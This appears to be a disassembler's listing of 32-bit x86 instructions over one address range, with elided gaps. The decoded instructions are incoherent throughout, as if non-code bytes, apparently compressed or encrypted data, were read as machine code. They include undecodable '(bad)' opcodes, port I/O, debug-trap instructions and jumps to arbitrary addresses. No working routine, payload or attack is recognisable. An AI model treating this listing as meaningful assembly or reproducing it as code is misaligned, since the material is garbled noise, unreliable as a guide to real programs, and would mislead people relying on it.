  42abe4:	mov    al,0xf4
  42abe6:	fdiv   st,st(1)
  42abe8:	repz in eax,dx
  42abea:	or     DWORD PTR [edi+0xa],esp
  42abed:	xchg   edx,eax
  42abee:	gs dec ebp
  42abf0:	in     eax,dx
  42abf1:	adc    BYTE PTR [ebp-0x3d],0xab
  42abf5:	lea    esi,[ecx-0x28]
  42abf8:	add    edx,DWORD PTR [ebx-0x3b]
  42abfb:	cmp    BYTE PTR [eax+0x7c9acec0],0x97
  42ac02:	fidivr DWORD PTR [edi+eax*4-0x4a]
  42ac06:	push   ss
  42ac07:	xor    BYTE PTR [edi-0x62976bb5],dl
  42ac0d:	cmp    eax,ecx
  42ac0f:	adc    al,0x74
  42ac11:	inc    edx
  42ac12:	or     BYTE PTR [eax],al
  42ac14:	mov    BYTE PTR ds:0x8806b471,ch
  42ac1a:	mov    edi,0x48848eb4
  42ac1f:	loope  0x42abe5
  42ac21:	and    eax,edx
  42ac23:	mov    bh,0x11
  42ac25:	dec    edi
  42ac26:	mov    DWORD PTR [esi+ebx*8-0x1fc538ef],esi
  42ac2d:	sub    BYTE PTR [ebx],dh
  42ac2f:	scas   al,BYTE PTR es:[edi]
  42ac30:	out    0xeb,eax
  42ac32:	and    bh,BYTE PTR [eax-0x1e814ace]
  42ac38:	xchg   esi,eax
  42ac39:	test   DWORD PTR [ebp+0x72],esi
  42ac3c:	mov    al,0xfb
  42ac3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac40:	arpl   WORD PTR [ebx],cx
  42ac42:	mov    eax,0x9489c34
  42ac47:	mov    al,ds:0x45beb7b8
  42ac4c:	ret    0xe359
  42ac4f:	push   esp
  42ac50:	sbb    DWORD PTR [esp+esi*8-0x6ed8f046],edi
  42ac57:	push   eax
  42ac58:	das    
  42ac59:	xchg   ebp,eax
  42ac5a:	jle    0x42ac51
  42ac5c:	or     BYTE PTR [esi],dh
  42ac5e:	inc    ebx
  42ac5f:	sbb    eax,0xcc42f267
  42ac64:	sbb    eax,0x561847f1
  42ac69:	retf   0xd28d
  42ac6c:	jp     0x42acac
  42ac6e:	sub    eax,0x488d762d
  42ac73:	vpmullw ymm5,ymm1,YMMWORD PTR [edi+edi*8+0x38b8d622]
  42ac7c:	sub    BYTE PTR [eax+edx*2],bh
  42ac7f:	rcl    DWORD PTR [esi],0xa7
  42ac82:	push   esp
  42ac83:	cs hlt 
  42ac85:	sbb    DWORD PTR [ebx-0x24a52217],edi
  42ac8b:	scas   eax,DWORD PTR es:[edi]
  42ac8c:	sbb    al,0x66
  42ac8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac8f:	and    al,BYTE PTR [eax]
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	xchg   ebp,eax
  42ad01:	bound  ecx,QWORD PTR [ebx]
  42ad03:	mov    esi,0x1c9ac
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	in     eax,dx
  42ad0d:	mov    ecx,0x4ec94518
  42ad12:	ins    BYTE PTR es:[edi],dx
  42ad13:	add    edx,esi
  42ad15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad16:	mov    WORD PTR [ecx-0x2832518a],cs
  42ad1c:	(bad)
  42ad1f:	adc    BYTE PTR [edx-0x147ba725],cl
  42ad25:	pop    edx
  42ad26:	sbb    cl,ch
  42ad28:	aaa    
  42ad29:	(bad)  
  42ad2a:	xor    eax,0xabec3a0b
  42ad2f:	xlat   BYTE PTR ds:[ebx]
  42ad30:	push   ebx
  42ad31:	jp     0x42acc1
  42ad33:	in     eax,0xa
  42ad35:	pushf  
  42ad36:	mov    ebp,0x7b374038
  42ad3b:	and    BYTE PTR [ebx+0x7e],ah
  42ad3e:	pop    ecx
  42ad3f:	daa    
  42ad40:	dec    ecx
  42ad41:	call   0x4e83d390
  42ad46:	mov    eax,gs
  42ad48:	out    0xc7,eax
  42ad4a:	pop    ecx
  42ad4b:	and    dh,bh
  42ad4d:	xor    ebp,DWORD PTR [eax-0x2bb62e8]
  42ad53:	enter  0x867,0x2a
  42ad57:	xchg   ecx,eax
  42ad58:	or     al,0x1b
  42ad5a:	js     0x42ad22
  42ad5c:	repz dec edi
  42ad5e:	xchg   esi,eax
  42ad5f:	(bad)  [ecx-0x671faa50]
  42ad65:	mov    ah,0xf9
  42ad67:	cmp    edx,DWORD PTR [eax+edx*8-0xefdcc1c]
  42ad6e:	(bad)  
  42ad6f:	ins    BYTE PTR es:[di],dx
  42ad71:	pushf  
  42ad72:	pop    ss
  42ad73:	out    dx,al
  42ad74:	pop    eax
  42ad75:	(bad)  
  42ad76:	and    bl,dl
  42ad78:	call   0xa644c834
  42ad7d:	dec    esp
  42ad7e:	lds    esi,FWORD PTR [edx-0x26]
  42ad81:	push   eax
  42ad82:	jne    0x42ad1c
  42ad84:	inc    edx
  42ad85:	jl     0x42ad5d
  42ad87:	inc    esi
  42ad88:	cmp    al,0xce
  42ad8a:	jg     0x42ad7f
  42ad8c:	sbb    cl,bh
  42ad8e:	jge    0x42ae09
  42ad90:	js     0x42ae0f
  42ad92:	dec    esi
  42ad93:	stc    
  42ad94:	push   ss
  42ad95:	pusha  
  42ad96:	sub    al,BYTE PTR [edx]
  42ad98:	cld    
  42ad99:	add    BYTE PTR [esi],ah
  42ad9b:	repz inc esp
  42ad9d:	inc    edx
  42ad9e:	xchg   ebp,eax
  42ad9f:	ret    
  42ada0:	repnz push es
  42ada2:	jl     0x42adea
  42ada4:	fild   QWORD PTR [ebp+eiz*8-0x41]
  42ada8:	pop    ss
  42ada9:	lahf   
  42adaa:	mov    WORD PTR [esi-0x22],es
  42adad:	or     ah,BYTE PTR [esi-0x6628c2a8]
  42adb3:	nop
  42adb4:	mov    ch,dh
  42adb6:	jne    0x42adcc
  42adb8:	out    0xe3,eax
  42adba:	ins    BYTE PTR es:[edi],dx
  42adbb:	add    ecx,esp
  42adbd:	mov    ah,0x96
  42adbf:	sub    esi,eax
  42adc1:	mov    edi,0xb6576b77
  42adc6:	xchg   ebp,eax
  42adc7:	add    al,0x70
  42adc9:	cdq    
  42adca:	scas   eax,DWORD PTR es:[edi]
  42adcb:	lods   eax,DWORD PTR ds:[esi]
  42adcc:	into   
  42adcd:	cmc    
  42adce:	push   ds
  42adcf:	cli    
  42add0:	pop    es
  42add1:	lods   eax,DWORD PTR ds:[esi]
  42add2:	daa    
  42add3:	or     eax,ebx
  42add5:	lahf   
  42add6:	jno    0x42ae55
  42add8:	(bad)  
  42adda:	int3   
  42addb:	jle    0x42ad7d
  42addd:	pop    es
  42adde:	ret    0x7076
  42ade1:	fadd   DWORD PTR [ebp-0x1ef0013a]
  42ade7:	loop   0x42ae12
  42ade9:	call   0x13bbbdde
  42adee:	push   eax
  42adef:	mov    eax,0xa45a587
  42adf4:	dec    ecx
  42adf5:	push   ebp
  42adf6:	nop    DWORD PTR [ebp-0x7820f10c]
  42adfd:	push   esi
  42adfe:	dec    esp
  42adff:	fcom   DWORD PTR [edi]
  42ae01:	dec    esi
  42ae02:	pusha  
  42ae03:	xlat   BYTE PTR ds:[ebx]
  42ae04:	mov    ah,0x18
  42ae06:	fnstenv [ebx+ebx*1-0x76]
  42ae0a:	add    eax,0xe77049cd
  42ae0f:	lds    eax,FWORD PTR [eax]
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	mov    ds:0xb0d0605e,eax
  42ae85:	retf   0x1
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	or     DWORD PTR [eax],ecx
  42ae8e:	xor    cl,dh
  42ae90:	fwait
  42ae91:	lea    edi,[ecx-0x74]
  42ae94:	das    
  42ae95:	int    0x20
  42ae97:	std    
  42ae98:	add    esi,DWORD PTR [eax+eax*1-0x2f]
  42ae9c:	sar    BYTE PTR [edi+0x264c065b],0xe
  42aea3:	dec    eax
  42aea4:	push   eax
  42aea5:	shr    DWORD PTR [edx-0x4999c61c],1
  42aeab:	sub    DWORD PTR [edi],eax
  42aead:	or     BYTE PTR [eax-0x79],0x2b
  42aeb1:	lods   al,BYTE PTR ds:[esi]
  42aeb2:	fiadd  DWORD PTR [edx-0x364a4024]
  42aeb8:	mov    ah,0xc2
  42aeba:	adc    bh,BYTE PTR [esi]
  42aebc:	sbb    al,0xe1
  42aebe:	in     al,0xee
  42aec0:	push   es
  42aec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aec2:	bound  eax,QWORD PTR [ebx+edi*8+0x32]
  42aec6:	inc    esi
  42aec7:	loopne 0x42ae82
  42aec9:	pop    edx
  42aeca:	es pop esp
  42aecc:	gs stc 
  42aece:	lds    esi,FWORD PTR [ebp+0x29]
  42aed1:	loopne 0x42aeb5
  42aed3:	pop    esp
  42aed4:	jo     0x42ae92
  42aed6:	or     al,BYTE PTR [edx-0x6a]
  42aed9:	aas    
  42aeda:	inc    edx
  42aedb:	cmp    al,0x2c
  42aedd:	push   cs
  42aede:	dec    eax
  42aedf:	xchg   edx,eax
  42aee0:	xor    esi,DWORD PTR [ecx-0x61]
  42aee3:	or     al,0xe5
  42aee5:	jg     0x42aed0
  42aee7:	xor    dl,bl
  42aee9:	or     al,0x67
  42aeeb:	or     DWORD PTR [edi],esi
  42aeed:	imul   ebx,DWORD PTR [eax],0x19
  42aef0:	(bad)  
  42aef1:	push   edi
  42aef2:	cmp    al,0x92
  42aef4:	mov    ds:0x31fe7c4e,eax
  42aef9:	stos   DWORD PTR es:[edi],eax
  42aefa:	stos   BYTE PTR es:[edi],al
  42aefb:	cmp    al,0x9c
  42aefd:	dec    ebx
  42aefe:	xor    DWORD PTR [edi+0x2e],esi
  42af01:	mov    bl,0x3d
  42af03:	dec    ecx
  42af04:	dec    esp
  42af05:	lahf   
  42af06:	xchg   dh,dh
  42af08:	nop
  42af09:	mov    al,ds:0xe361f170
  42af0e:	outs   dx,BYTE PTR ds:[esi]
  42af0f:	fidiv  DWORD PTR [eax-0x3c508ad4]
  42af15:	add    eax,0x6d3ea8b
  42af1a:	jmp    0x42af41
  42af1c:	out    dx,eax
  42af1d:	fs or  al,0x62
  42af20:	fidiv  WORD PTR [edx-0xb]
  42af23:	mov    dh,0x84
  42af25:	inc    esp
  42af26:	mov    al,ds:0x93c67e64
  42af2b:	jbe    0x42af65
  42af2d:	jne    0x42aeed
  42af2f:	ja     0x42af93
  42af31:	jnp    0x42afad
  42af33:	pusha  
  42af34:	or     cl,BYTE PTR [ecx-0x32]
  42af37:	xchg   ebx,eax
  42af38:	xchg   esi,eax
  42af39:	jp     0x42af54
  42af3b:	sub    al,0x3e
  42af3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af3e:	neg    BYTE PTR [esi+0x32]
  42af41:	add    al,0x17
  42af43:	pop    esi
  42af44:	not    BYTE PTR [ecx-0x6e]
  42af47:	icebp  
  42af48:	sub    BYTE PTR [ebx],0xd7
  42af4b:	adc    al,BYTE PTR [ecx]
  42af4d:	xor    dl,BYTE PTR [edi+0xfc44ebc]
  42af53:	ficom  WORD PTR [eax+0x40]
  42af56:	adc    eax,0x6e08ee3b
  42af5b:	clc    
  42af5c:	dec    edi
  42af5d:	jle    0x42af41
  42af5f:	mov    dh,0x42
  42af61:	ds push ebx
  42af63:	lock inc edi
  42af65:	pop    ss
  42af66:	test   al,0x54
  42af68:	retf   0xcad6
  42af6b:	arpl   WORD PTR [ecx-0x76c2def7],ax
  42af71:	icebp  
  42af72:	sti    
  42af73:	int    0x26
  42af75:	inc    edi
  42af76:	les    eax,FWORD PTR [edx]
  42af78:	loopne 0x42af16
  42af7a:	fmul   QWORD PTR [edi+0x3d416623]
  42af80:	push   edi
  42af81:	mov    bh,0xd2
  42af83:	jmp    0x3c5:0x672d2596
  42af8a:	sti    
  42af8b:	push   ebp
  42af8c:	loop   0x42af28
  42af8e:	mov    ch,0x0
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	daa    
  42b001:	imul   ebp,DWORD PTR cs:[edi+0x1cbb4],0x104
  42b00c:	adc    edx,DWORD PTR [eax+0x4c069187]
  42b012:	cs xor eax,0x7ccd94b2
  42b018:	aaa    
  42b019:	aad    0x9c
  42b01b:	(bad)  
  42b01c:	xor    al,0xbc
  42b01e:	adc    BYTE PTR [ebp+0x15],cl
  42b021:	xchg   ecx,eax
  42b022:	pop    ebp
  42b023:	inc    ecx
  42b024:	pop    ecx
  42b025:	cmp    dl,al
  42b027:	adc    BYTE PTR [edx+0x3],dl
  42b02a:	xchg   esp,eax
  42b02b:	jp     0x42b08c
  42b02d:	mov    bh,0x78
  42b02f:	push   cs
  42b030:	sbb    BYTE PTR [edi+edi*2+0x25a33764],0xdb
  42b038:	mov    eax,0xb4e40d84
  42b03d:	xor    eax,eax
  42b03f:	dec    esp
  42b040:	sub    bl,BYTE PTR [ebx]
  42b042:	jecxz  0x42b099
  42b044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b045:	push   ebp
  42b046:	pop    ecx
  42b047:	pusha  
  42b048:	nop
  42b049:	enter  0x2ce7,0xee
  42b04d:	ret    0x4015
  42b050:	das    
  42b051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b052:	and    al,0x13
  42b054:	jmp    0xb52af0d9
  42b059:	xor    al,0x6c
  42b05b:	cmp    al,0x4a
  42b05d:	into   
  42b05e:	js     0x42b084
  42b060:	jg     0x42b085
  42b062:	xchg   BYTE PTR [ebx],cl
  42b064:	xchg   ebp,eax
  42b065:	pop    ecx
  42b066:	mov    BYTE PTR [eax-0x63184bc4],bl
  42b06c:	mov    ecx,0xd4585d1
  42b071:	test   BYTE PTR [ebp+eiz*1+0x4f],ch
  42b075:	cmp    DWORD PTR [ebp+0x47],0xbc7407ec
  42b07c:	mov    eax,ds:0x67c6658e
  42b081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b082:	call   0x737cd3da
  42b087:	inc    eax
  42b088:	in     eax,0x93
  42b08a:	lods   eax,DWORD PTR ds:[esi]
  42b08b:	jae    0x42b0c8
  42b08d:	jl     0x42b0b1
  42b08f:	jecxz  0x42b0fe
  42b091:	cmp    DWORD PTR [ecx+0x63],eax
  42b094:	ds inc esp
  42b096:	jmp    0xea09:0xea719067
  42b09d:	jbe    0x42b0f1
  42b09f:	jge    0x42b11b
  42b0a1:	icebp  
  42b0a2:	(bad)  
  42b0a3:	jne    0x42b06a
  42b0a5:	jg     0x42b125
  42b0a7:	pusha  
  42b0a8:	in     al,0x73
  42b0aa:	(bad)  
  42b0ab:	jbe    0x42b0fc
  42b0ad:	(bad)  
  42b0ae:	leave  
  42b0af:	or     al,BYTE PTR [edx-0x7d]
  42b0b2:	and    DWORD PTR [esp+ecx*4+0x5d],edx
  42b0b6:	cwde   
  42b0b7:	in     al,0x3f
  42b0b9:	xchg   edi,eax
  42b0ba:	mov    bp,es
  42b0bd:	mov    edi,0xae49783f
  42b0c2:	adc    DWORD PTR [ebp+0x313e2a02],edi
  42b0c8:	mov    ah,0x4d
  42b0ca:	std    
  42b0cb:	mov    BYTE PTR [esi+0x79],dl
  42b0ce:	data16 jge 0x42b0ac
  42b0d1:	mov    eax,ds:0xd1157e05
  42b0d6:	and    BYTE PTR [ecx-0x58cb603b],0xd7
  42b0dd:	jp     0x42b143
  42b0df:	in     eax,0xb3
  42b0e1:	aam    0x8
  42b0e3:	or     bl,BYTE PTR [ebp+0x5e]
  42b0e6:	inc    edx
  42b0e7:	(bad)  
  42b0e8:	out    0xda,eax
  42b0ea:	push   ecx
  42b0eb:	xlat   BYTE PTR ds:[ebx]
  42b0ec:	pop    ecx
  42b0ed:	xchg   edi,eax
  42b0ee:	sbb    dl,BYTE PTR [ebx]
  42b0f0:	pop    ss
  42b0f1:	test   DWORD PTR [edx+ebp*4-0x22],0x4776534b
  42b0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0fa:	push   esp
  42b0fb:	add    BYTE PTR [esi+0x459c04cb],cl
  42b101:	jg     0x42b17c
  42b103:	icebp  
  42b104:	stc    
  42b105:	jmp    0x32bf:0x4e37f268
  42b10c:	int3   
  42b10d:	xor    eax,0x206a
	...
  42b172:	add    BYTE PTR [eax],al
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	push   eax
  42b181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b182:	loopne 0x42b1e1
  42b184:	mov    eax,0x40001cc
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    BYTE PTR [esi],cl
  42b18d:	xchg   BYTE PTR [edi],bh
  42b18f:	test   BYTE PTR [edx],bh
  42b191:	mov    bh,0x2d
  42b193:	mov    ds:0xd1982b1e,al
  42b198:	inc    ebx
  42b199:	sbb    al,0xdf
  42b19b:	mov    ebx,0x539e070
  42b1a0:	or     cl,dl
  42b1a2:	test   eax,0x1643a8da
  42b1a7:	sub    al,0x7e
  42b1a9:	loop   0x42b1e2
  42b1ab:	(bad)  
  42b1ad:	out    0x45,eax
  42b1af:	sbb    eax,0xcc777353
  42b1b4:	jge    0x42b1ac
  42b1b6:	loope  0x42b16a
  42b1b8:	add    BYTE PTR [edi-0x7b],ah
  42b1bb:	leave  
  42b1bc:	jecxz  0x42b162
  42b1be:	xor    BYTE PTR [eax+0x473f6352],ah
  42b1c4:	sub    BYTE PTR [esi],cl
  42b1c6:	sbb    eax,0x64441553
  42b1cb:	pop    eax
  42b1cc:	add    BYTE PTR [edi],dh
  42b1ce:	sti    
  42b1cf:	inc    esi
  42b1d0:	imul   ebx,DWORD PTR [ebp+0x36],0xfa8d0a73
  42b1d7:	mov    WORD PTR [ecx-0x1b],?
  42b1da:	mov    ecx,0xe4783bec
  42b1df:	in     eax,dx
  42b1e0:	push   eax
  42b1e1:	xor    al,0x53
  42b1e3:	sbb    DWORD PTR [ebp+0x6a],0x7
  42b1e7:	inc    ebp
  42b1e8:	clc    
  42b1e9:	pop    edi
  42b1ea:	cmp    al,BYTE PTR [ebp-0x7d4d9762]
  42b1f0:	fisttp WORD PTR [eiz*4+0x2246d577]
  42b1f7:	mov    ebx,0xf3ef9cdc
  42b1fc:	cmp    esi,DWORD PTR [edi]
  42b1fe:	dec    eax
  42b1ff:	xchg   edi,eax
  42b200:	int3   
  42b201:	sub    dl,BYTE PTR [esi+ebx*2]
  42b204:	jp     0x42b214
  42b206:	shr    BYTE PTR [edi],0x12
  42b209:	sbb    eax,0x272f3823
  42b20e:	mov    ch,0xff
  42b210:	cs xor al,0x19
  42b213:	mov    eax,ds:0x18c4e6e0
  42b218:	lods   al,BYTE PTR ds:[esi]
  42b219:	push   eax
  42b21a:	jb     0x42b234
  42b21c:	mov    esp,0x45b56047
  42b221:	mov    dh,0x8f
  42b223:	mov    esi,0x6a0f9768
  42b228:	stos   DWORD PTR es:[edi],eax
  42b229:	xchg   esp,eax
  42b22a:	mov    ds:0x61bde14a,eax
  42b22f:	push   esp
  42b230:	pop    edi
  42b231:	loop   0x42b1b4
  42b233:	aaa    
  42b234:	aas    
  42b235:	ins    DWORD PTR es:[edi],dx
  42b236:	sub    al,0x38
  42b238:	jle    0x42b270
  42b23a:	leave  
  42b23b:	sbb    al,0x41
  42b23d:	push   ss
  42b23e:	mov    ds:0x232d6645,al
  42b243:	or     DWORD PTR [ebp*4+0x433cf983],edi
  42b24a:	sbb    BYTE PTR [eax],al
  42b24c:	sti    
  42b24d:	scas   eax,DWORD PTR es:[edi]
  42b24e:	adc    bh,BYTE PTR [edi+0x47bd3f43]
  42b254:	arpl   WORD PTR [ebx-0x3a3713d4],sp
  42b25a:	cmp    ah,BYTE PTR [ebp-0x217b4a35]
  42b260:	jbe    0x42b266
  42b262:	jb     0x42b2b1
  42b264:	std    
  42b265:	icebp  
  42b266:	cwde   
  42b267:	xor    DWORD PTR [edi],esp
  42b269:	je     0x42b1fb
  42b26b:	test   al,0x54
  42b26d:	inc    ecx
  42b26e:	or     ecx,DWORD PTR [ebp-0x13]
  42b271:	xchg   DWORD PTR [eax+0x31],eax
  42b274:	add    ah,BYTE PTR [edx+0x1f77629]
  42b27a:	jnp    0x42b2cf
  42b27c:	xlat   BYTE PTR ds:[ebx]
  42b27d:	push   ebx
  42b27e:	push   ds
  42b27f:	add    bl,cl
  42b281:	pop    ebp
  42b282:	mov    ds:0xd0033c93,eax
  42b287:	inc    edx
  42b288:	out    dx,al
  42b289:	aam    0xdb
  42b28b:	stos   DWORD PTR es:[edi],eax
  42b28c:	mov    DWORD PTR [ebp-0x7f],ebx
  42b28f:	ret    0x0
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x5a738e65
  42b301:	cmp    edx,ebx
  42b303:	and    al,0xbc
  42b305:	int    0x1
  42b307:	add    BYTE PTR [ecx+eax*1],al
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	xor    BYTE PTR [ebx],al
  42b30e:	push   edx
  42b30f:	pushf  
  42b310:	hlt    
  42b311:	je     0x42b381
  42b313:	and    ebx,esp
  42b315:	pop    esp
  42b316:	pcmpgtw mm1,QWORD PTR [ebp+0x3a28c303]
  42b31d:	stc    
  42b31e:	ror    edi,1
  42b320:	std    
  42b321:	nop
  42b322:	mov    edx,DWORD PTR [eax+0x4351e4b]
  42b328:	cmp    al,0x2e
  42b32a:	ror    BYTE PTR [ebx-0x1d],0x68
  42b32e:	adc    BYTE PTR [edi+ebp*1],0xc8
  42b332:	test   DWORD PTR [ebp+0x3e],ebp
  42b335:	out    dx,eax
  42b336:	addr16 xchg ebp,eax
  42b338:	in     eax,0xfd
  42b33a:	pushf  
  42b33b:	outs   dx,BYTE PTR ds:[esi]
  42b33c:	dec    ecx
  42b33d:	dec    eax
  42b33e:	shr    DWORD PTR [edi-0x36],1
  42b341:	aad    0x3
  42b343:	cld    
  42b344:	imul   edi,ebp,0xffffffce
  42b347:	arpl   WORD PTR [ecx+0x2ebf2e11],bx
  42b34d:	xor    DWORD PTR [edx-0x75],ebx
  42b350:	inc    esi
  42b351:	cmp    DWORD PTR [ebx-0x1b77601f],edi
  42b357:	bound  eax,QWORD PTR [edi+ebx*8-0x1101747e]
  42b35e:	ror    DWORD PTR [edx-0xec078d5],1
  42b364:	or     DWORD PTR [edx+edi*4-0x6623792b],edi
  42b36b:	dec    ebx
  42b36c:	mov    dh,0x31
  42b36e:	xor    ebp,esp
  42b370:	(bad)  [esi]
  42b372:	adc    bl,BYTE PTR [esi-0x4c]
  42b375:	jne    0x42b3ca
  42b377:	loope  0x42b3c7
  42b379:	repz sub ch,bl
  42b37c:	pop    es
  42b37d:	test   esi,ecx
  42b37f:	pop    esp
  42b380:	inc    edi
  42b381:	xor    eax,0x428e9924
  42b386:	inc    edx
  42b387:	enter  0xb2be,0x23
  42b38b:	popf   
  42b38c:	sbb    ch,BYTE PTR [ecx-0x1c]
  42b38f:	and    al,0xf5
  42b391:	sbb    DWORD PTR [ebx-0x52],edx
  42b394:	mov    ch,0xfa
  42b396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b397:	rcr    BYTE PTR [ebx],cl
  42b399:	add    bl,ah
  42b39b:	xor    ebx,DWORD PTR [eax+0x133ace57]
  42b3a1:	cmp    eax,0x1d18d8c5
  42b3a6:	std    
  42b3a7:	(bad)  
  42b3a8:	xchg   edi,eax
  42b3a9:	jl     0x42b339
  42b3ab:	xchg   ecx,eax
  42b3ac:	mov    al,0x4
  42b3ae:	retf   
  42b3af:	xchg   edi,eax
  42b3b0:	cmp    al,0x3b
  42b3b2:	jmp    0xefe85c34
  42b3b7:	inc    ebp
  42b3b8:	sbb    eax,0xf1bd937c
  42b3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3be:	clc    
  42b3bf:	sbb    eax,0x8c6cfdbc
  42b3c4:	retf   
  42b3c5:	sbb    eax,0x79387aa7
  42b3ca:	and    edx,edi
  42b3cc:	(bad)
  42b3cf:	bnd je 0x42b3ba
  42b3d2:	lock xchg DWORD PTR ds:0x59e78856,ecx
  42b3d9:	in     al,dx
  42b3da:	test   esp,0x321b55e4
  42b3e0:	push   esp
  42b3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3e2:	push   es
  42b3e3:	pop    edx
  42b3e4:	fidivr DWORD PTR [ebx]
  42b3e6:	cmp    al,BYTE PTR [ebp+0x1381b0a8]
  42b3ec:	(bad)  
  42b3ed:	outs   dx,DWORD PTR ds:[esi]
  42b3ee:	xor    DWORD PTR ds:0x9a385791,ecx
  42b3f4:	pop    ds
  42b3f5:	(bad)  
  42b3f6:	lahf   
  42b3f7:	mov    dl,0xb5
  42b3f9:	popf   
  42b3fa:	mov    ds:0xc12b4b8d,eax
  42b3ff:	cwde   
  42b400:	aad    0xf2
  42b402:	nop
  42b403:	popf   
  42b404:	out    dx,al
  42b405:	adc    eax,0xc6b86e19
  42b40a:	sbb    esi,DWORD PTR [edi-0x5c87a61d]
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   esi,ebx
  42b481:	mov    bl,BYTE PTR [eax+0x20]
  42b484:	ror    dh,0x1
  42b487:	add    BYTE PTR [ecx+eax*1],al
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	xchg   edx,eax
  42b48d:	mov    bl,ah
  42b48f:	push   0xffffff9b
  42b491:	add    ah,0x9c
  42b494:	adc    esi,DWORD PTR [edx+0x40]
  42b497:	mov    ds:0x47dbcd7a,al
  42b49c:	xor    BYTE PTR [ecx-0x23194955],bl
  42b4a2:	scas   al,BYTE PTR es:[edi]
  42b4a3:	call   0x865cae25
  42b4a8:	or     al,0x70
  42b4aa:	xor    cl,BYTE PTR [ebx-0x6e269eee]
  42b4b0:	in     al,0xa0
  42b4b2:	mov    cl,0xf7
  42b4b4:	add    ah,BYTE PTR [ecx+0x5a90a543]
  42b4ba:	mov    dl,0xa9
  42b4bc:	pop    es
  42b4bd:	cmc    
  42b4be:	in     al,0x38
  42b4c0:	(bad)  
  42b4c1:	jmp    0xbde1507e
  42b4c6:	div    BYTE PTR [eax]
  42b4c8:	imul   esi,DWORD PTR [ebx+0x3e],0xa2590da2
  42b4cf:	add    bl,al
  42b4d1:	loope  0x42b50a
  42b4d3:	stc    
  42b4d4:	pop    ss
  42b4d5:	inc    esi
  42b4d6:	mov    ebx,ds
  42b4d8:	test   edx,edx
  42b4da:	repnz push ebx
  42b4dc:	pop    edx
  42b4dd:	inc    edi
  42b4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4df:	data16 je 0x42b4a9
  42b4e2:	or     ecx,DWORD PTR [esi]
  42b4e4:	xchg   ecx,eax
  42b4e5:	test   DWORD PTR [eax+0xe5561fa],eax
  42b4eb:	add    al,0xac
  42b4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4ee:	xor    DWORD PTR [edx-0x5d554c38],ecx
  42b4f4:	jno    0x42b551
  42b4f6:	or     eax,0x679db5ca
  42b4fb:	dec    esp
  42b4fc:	mov    ds:0x28115c49,eax
  42b501:	jo     0x42b579
  42b503:	pop    eax
  42b504:	and    BYTE PTR [esi],0x98
  42b507:	xor    BYTE PTR [ecx],al
  42b509:	and    eax,0xc8620d06
  42b50e:	push   0xffffff8c
  42b510:	mov    ebp,eax
  42b512:	aaa    
  42b513:	mov    edx,0x59a62c05
  42b518:	dec    edx
  42b519:	outs   dx,BYTE PTR ds:[esi]
  42b51a:	jns    0x42b4cb
  42b51c:	sub    bh,bh
  42b51e:	iret   
  42b51f:	call   0xb0fb:0x8577d493
  42b526:	ret    0x8600
  42b529:	cmp    BYTE PTR [edi-0x5a],dh
  42b52c:	test   eax,0x8f008970
  42b531:	push   cs
  42b532:	mov    dh,0xee
  42b534:	pop    ebp
  42b535:	pop    esi
  42b536:	std    
  42b537:	(bad)  
  42b539:	pusha  
  42b53a:	xor    dl,BYTE PTR [esi-0x2ce0b24f]
  42b540:	jno    0x42b4d8
  42b542:	lahf   
  42b543:	into   
  42b544:	cld    
  42b545:	adc    eax,0xaaa16d9b
  42b54a:	xchg   edx,eax
  42b54b:	out    dx,al
  42b54c:	mov    cl,0xff
  42b54e:	ja     0x42b547
  42b550:	shl    DWORD PTR [ebx],1
  42b552:	stos   BYTE PTR es:[edi],al
  42b553:	push   edi
  42b554:	adc    ebp,DWORD PTR [edx+0x44]
  42b557:	mov    ds,WORD PTR [eax+ebx*8-0x10]
  42b55b:	pop    eax
  42b55c:	loope  0x42b514
  42b55e:	inc    ebp
